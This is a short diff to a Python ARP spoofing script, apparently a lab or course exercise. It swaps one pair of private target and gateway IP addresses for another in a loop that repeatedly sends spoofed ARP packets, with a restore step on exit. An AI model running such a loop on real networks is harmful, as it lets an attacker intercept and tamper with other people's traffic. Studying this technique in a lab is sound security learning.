@@ -35,11 +35,11 @@ def restore(destination_ip, source_ip):
 sent_packets_count = 0
 try:
     while True:
-        spoof("192.168.1.115", "192.168.1.1")
-        spoof("192.168.1.1", "192.168.1.115")
+        spoof("192.168.57.129", "192.168.57.2")
+        spoof("192.168.57.2", "192.168.57.129")
         sent_packets_count = sent_packets_count + 2
         print(f"\r[+] Send {str(sent_packets_count)} packets", end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\r[+] Delected CATRL + C... Quitting\n", end="")
-    restore("192.168.1.115", "192.168.1.1")
+    restore("192.168.57.129", "192.168.57.2")
